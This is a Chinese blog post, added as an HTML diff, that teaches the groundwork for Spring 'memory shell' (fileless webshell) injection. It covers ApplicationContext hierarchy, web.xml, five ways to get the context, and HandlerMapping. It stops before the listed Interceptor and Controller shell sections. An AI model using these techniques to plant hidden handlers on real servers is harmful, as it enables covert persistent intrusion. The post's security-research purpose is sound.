@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="spring内存马前置知识Bean通俗来讲：  bean 是对象  bean 被 IoC 容器管理  Spring 应用主要是由一个个的 bean 构成的   ApplicationContextSpring 框架中，BeanFactory 接口是 Spring IoC容器 的实际代表者。 ApplicationContext 接口继承了 BeanFactory,使用他是一个ioc容器 Conte">
+<meta property="og:type" content="article">
+<meta property="og:title" content="spring内存马">
+<meta property="og:url" content="http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="毛利小五郎">
+<meta property="og:description" content="spring内存马前置知识Bean通俗来讲：  bean 是对象  bean 被 IoC 容器管理  Spring 应用主要是由一个个的 bean 构成的   ApplicationContextSpring 框架中，BeanFactory 接口是 Spring IoC容器 的实际代表者。 ApplicationContext 接口继承了 BeanFactory,使用他是一个ioc容器 Conte">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/imgs/20250115010252443.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/imgs/20250115015703882.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/imgs/20250116001501089.png">
+<meta property="article:published_time" content="2025-01-12T15:59:45.000Z">
+<meta property="article:modified_time" content="2025-01-15T18:25:09.294Z">
+<meta property="article:author" content="Mouri-Kogorou">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/imgs/20250115010252443.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>spring内存马</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/20/Spring1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/12/LdapAttribute%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&text=spring内存马"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&title=spring内存马"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=spring内存马"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=spring内存马&body=Check out this article: http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&title=spring内存马"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&title=spring内存马"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&title=spring内存马"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&title=spring内存马"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&name=spring内存马&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/12/spring%E5%86%85%E5%AD%98%E9%A9%AC/&t=spring内存马"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#spring%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">spring内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bean"><span class="toc-number">1.1.1.</span> <span class="toc-text">Bean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ApplicationContext"><span class="toc-number">1.1.2.</span> <span class="toc-text">ApplicationContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ContextLoaderListener-%E4%B8%8E-DispatcherServlet"><span class="toc-number">1.1.3.</span> <span class="toc-text">ContextLoaderListener 与 DispatcherServlet</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ContextLoaderListener"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">ContextLoaderListener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DispatcherServlet"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">DispatcherServlet</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">1.1.4.</span> <span class="toc-text">获取上下文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9AgetCurrentWebApplicationContext"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">方法一：getCurrentWebApplicationContext</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9AWebApplicationContextUtils"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">方法二：WebApplicationContextUtils</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9ARequestContextUtils"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">方法三：RequestContextUtils</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B-getAttribute"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">方法四: getAttribute</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%94-LiveBeansView"><span class="toc-number">1.1.4.5.</span> <span class="toc-text">方法五:LiveBeansView</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96HandlerMapping"><span class="toc-number">1.1.5.</span> <span class="toc-text">获取HandlerMapping</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intercetor%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.2.</span> <span class="toc-text">intercetor内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#intercetor-demo"><span class="toc-number">1.2.2.</span> <span class="toc-text">intercetor demo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Controller-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text">Controller 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#controller%E5%88%9B%E5%BB%BA%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.1.</span> <span class="toc-text">controller创建过程</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        spring内存马
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Mouri-Kogorou</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-12T15:59:45.000Z" class="dt-published" itemprop="datePublished">2025-01-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/java/" rel="tag">java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="spring内存马"><a href="#spring内存马" class="headerlink" title="spring内存马"></a>spring内存马</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Bean"><a href="#Bean" class="headerlink" title="Bean"></a>Bean</h3><p>通俗来讲：</p>
+<ol>
+<li><p>bean 是对象</p>
+</li>
+<li><p>bean 被 IoC 容器管理</p>
+</li>
+<li><p>Spring 应用主要是由一个个的 bean 构成的</p>
+</li>
+</ol>
+<h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>Spring 框架中，<code>BeanFactory</code> 接口是 <code>Spring</code> IoC容器 的实际代表者。</p>
+<p>ApplicationContext 接口继承了 BeanFactory,使用他是一个ioc容器</p>
+<h3 id="ContextLoaderListener-与-DispatcherServlet"><a href="#ContextLoaderListener-与-DispatcherServlet" class="headerlink" title="ContextLoaderListener 与 DispatcherServlet"></a>ContextLoaderListener 与 DispatcherServlet</h3><p>我们先来了解一下，<code>Root Context</code> 和 <code>Child Context</code> :</p>
+<ol>
+<li>Spring 应用中可以同时有多个 <code>Context</code>，其中只有一个 <code>Root Context</code>，剩下的全是 <code>Child Context</code></li>
+<li>所有<code>Child Context</code>都可以访问在 <code>Root Context</code>中定义的 <code>bean</code>，但是<code>Root Context</code>无法访问<code>Child Context</code>中定义的 <code>bean</code></li>
+<li>所有的<code>Context</code>在创建后，都会被作为一个属性添加到了 <code>ServletContext</code>中</li>
+</ol>
+<p>下面是一个典型 Spring 应用的 <code>web.xml</code> 配置示例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;<span class="symbol">&amp;lt;</span>a href=&quot;</span> <span class="attr">http:</span>=<span class="string">&quot;&quot;</span> <span class="attr">www.w3.org</span>=<span class="string">&quot;&quot;</span> <span class="attr">2001</span>=<span class="string">&quot;&quot;</span> <span class="attr">XMLSchema-instance</span>&quot;=<span class="string">&quot;&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;nofollow&quot;</span>&gt;</span>http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;</span><br><span class="line">         version=&quot;2.5&quot;&gt;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>HelloSpringMVC<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/dispatcherServlet-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="ContextLoaderListener"><a href="#ContextLoaderListener" class="headerlink" title="ContextLoaderListener"></a>ContextLoaderListener</h4><p><code>ContextLoaderListener</code> 主要被用来初始化全局唯一的<code>Root Context</code>，即 <code>Root WebApplicationContext</code>。这个 <code>Root WebApplicationContext</code> 会和其他 <code>Child Context</code> 实例共享它的 <code>IoC 容器</code>，供其他 <code>Child Context</code> 获取并使用容器中的 <code>bean</code>。</p>
+<p>回到 <code>web.xml</code> 中，其相关配置如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>依照规范，当没有显式配置 <code>ContextLoaderListener</code> 的 <code>contextConfigLocation</code> 时，程序会自动寻找 <code>/WEB-INF/applicationContext.xml</code>，作为配置文件，所以其实上面的 <code>&lt;context-param&gt;</code> 标签对其实完全可以去掉。</p>
+<h4 id="DispatcherServlet"><a href="#DispatcherServlet" class="headerlink" title="DispatcherServlet"></a>DispatcherServlet</h4><p><code>DispatcherServlet</code> 的主要作用是处理传入的web请求，根据配置的 URL pattern，将请求分发给正确的 Controller 和 View。<code>DispatcherServlet</code> 初始化完成后，会创建一个普通的 <code>Child Context</code> 实例。</p>
+<p>从下面的继承关系图中可以发现： <code>DispatcherServlet</code> 从本质上来讲是一个 <code>Servlet</code>（扩展了 <code>HttpServlet</code> )。</p>
+<p><img src="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/imgs/20250115010252443.png"></p>
+<p>回到 <code>web.xml</code> 中，其相关配置如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/dispatcherServlet-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面给 <code>org.springframework.web.servlet.DispatcherServlet</code> 类设置了个别名 <code>dispatcherServlet</code> ，并配置了它的 <code>contextConfigLocation</code> 参数值为 <code>/WEB-INF/dispatcherServlet-servlet.xml</code>。</p>
+<p>依照规范，当没有显式配置 <code>contextConfigLocation</code> 时，程序会自动寻找 &#96;&#96;&#x2F;WEB-INF&#x2F;<servlet-name>-servlet.xml<code>，作为配置文件。因为上面的 </code><servlet-name><code>是</code>dispatcherServlet<code>，所以当没有显式配置时，程序依然会自动找到 </code>&#x2F;WEB-INF&#x2F;dispatcherServlet-servlet.xml&#96; 配置文件。</p>
+<p>综上，可以了解到：每个具体的 <code>DispatcherServlet</code> 创建的是一个 <code>Child Context</code>，代表一个独立的 <code>IoC 容器</code>；而 <code>ContextLoaderListener</code> 所创建的是一个 <code>Root Context</code>，代表全局唯一的一个公共 <code>IoC 容器</code>。</p>
+<p>如果要访问和操作 <code>bean</code> ，一般要获得当前代码执行环境的<code>IoC 容器</code> 代表者 <code>ApplicationContext</code></p>
+<h3 id="获取上下文"><a href="#获取上下文" class="headerlink" title="获取上下文"></a>获取上下文</h3><h4 id="方法一：getCurrentWebApplicationContext"><a href="#方法一：getCurrentWebApplicationContext" class="headerlink" title="方法一：getCurrentWebApplicationContext"></a>方法一：getCurrentWebApplicationContext</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure>
+
+<p><code>getCurrentWebApplicationContext</code> 获得的是一个 <code>XmlWebApplicationContext</code> 实例类型的 <code>Root WebApplicationContext</code>。也可以是基于注解的 <code>AnnotationConfigWebApplicationContext</code></p>
+<h4 id="方法二：WebApplicationContextUtils"><a href="#方法二：WebApplicationContextUtils" class="headerlink" title="方法二：WebApplicationContextUtils"></a>方法二：WebApplicationContextUtils</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br></pre></td></tr></table></figure>
+
+<p>通过这种方法获得的也是一个 <code>Root WebApplicationContext</code></p>
+<p><strong>spring 5的WebApplicationContextUtils已经没有getWebApplicationContext方法</strong></p>
+<h4 id="方法三：RequestContextUtils"><a href="#方法三：RequestContextUtils" class="headerlink" title="方法三：RequestContextUtils"></a>方法三：RequestContextUtils</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br></pre></td></tr></table></figure>
+
+<p>通过这种方法获得的是一个 <code>Child WebApplicationContext</code></p>
+<p>它和方法二的差别就是少了WebApplicationContextUtils.getWebApplicationContext</p>
+<p>我们来解释一下方法二和三</p>
+<ol>
+<li>(ServletRequestAttributes)RequestContextHolder.currentRequestAttributes():通过 RequestContextHolder 获取当前请求的属性</li>
+<li>getRequest():就是从当前请求的属性获取里面的请求HttpServletRequest</li>
+<li>RequestContextUtils.getWebApplicationContext:获取基于 <code>HttpServletRequest</code> 的 <code>WebApplicationContext</code>,也就是仅与当前请求相关的上下文信息</li>
+<li>WebApplicationContextUtils.getWebApplicationContext:从 <code>WebApplicationContext</code> 中获取 <code>ServletContext</code>，全局作用域的上下文也就是<code>Root WebApplicationContext</code></li>
+</ol>
+<h4 id="方法四-getAttribute"><a href="#方法四-getAttribute" class="headerlink" title="方法四: getAttribute"></a>方法四: getAttribute</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>所有的<code>Context</code>在创建后，都会被作为一个属性添加到了<code>ServletContext</code>中</p>
+<p>查看当前所有的 <code>attributes</code>，发现确实保存有 <code>Context</code> 的属性名，</p>
+<p>其中 <code>org.springframework.web.servlet.DispatcherServlet.CONTEXT</code> 和 <code>org.springframework.web.servlet.DispatcherServlet.THEME_SOURCE</code> 属性名中都存放着一个名叫 <code>dispatcherServlet-servlet</code> 的 <code>Child WebApplicationContext</code>,因此，我们用&#96;&#96;dispatcherServlet-servlet<code>这个</code>Child WebApplicationContext&#96;</p>
+<p><img src="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/imgs/20250115015703882.png"></p>
+<p>上面代码中的 <code>currentRequestAttributes()</code> 替换成 <code>getRequestAttributes()</code> 也同样有效；<code>getAttribute</code> 参数中的 <code>0</code>代表从当前 <code>request</code> 中获取而不是从当前的 <code>session</code> 中获取属性值。</p>
+<h4 id="方法五-LiveBeansView"><a href="#方法五-LiveBeansView" class="headerlink" title="方法五:LiveBeansView"></a>方法五:LiveBeansView</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span><br><span class="line">java.lang.reflect.Field filed = Class.forName(&quot;org.springframework.context.support.LiveBeansView&quot;).getDeclaredField(&quot;applicationContexts&quot;);</span><br><span class="line">// 2. 属性被 private 修饰，所以 setAccessible true</span><br><span class="line">filed.setAccessible(true);</span><br><span class="line">// 3. 获取一个 ApplicationContext 实例</span><br><span class="line">org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();</span><br></pre></td></tr></table></figure>
+
+<p>spring boot 初始化过程中会往 <code>org.springframework.context.support.LiveBeansView</code> 类的 <code>applicationContexts</code> 属性中添加 <code>org.springframework.boot.web.servlet.context.AnnotationConfigServletWebServerApplicationContext</code> 类的对象。</p>
+<p>因为 <code>org.springframework.context.support.LiveBeansView</code> 类在 <code>spring-context</code> 3.2.x 版本（现在最新版本是 5.3.x）才加入其中，所以比较低版本的 spring 无法通过此方法获得 <code>ApplicationContext</code> 的实例。</p>
+<h3 id="获取HandlerMapping"><a href="#获取HandlerMapping" class="headerlink" title="获取HandlerMapping"></a>获取HandlerMapping</h3><p><code>DispatcherServlet</code> 接收到客户端请求后，将其传递给 <code>HandlerMapping</code>。</p>
+<p><code>HandlerMapping</code> 根据配置（如注解、XML 配置等）解析请求，找到对应的处理器。</p>
+<p>功能:</p>
+<ol>
+<li><p>解析请求路径：根据客户端发来的 HTTP 请求 URI 和相关信息（如请求方法、参数等），匹配合适的处理器。</p>
+</li>
+<li><p>返回处理器:  如果匹配成功，HandlerMapping 返回一个 HandlerExecutionChain 对象，包含：处理器（Controller 方法或 Bean），与之相关的拦截器链（HandlerInterceptor)</p>
+</li>
+</ol>
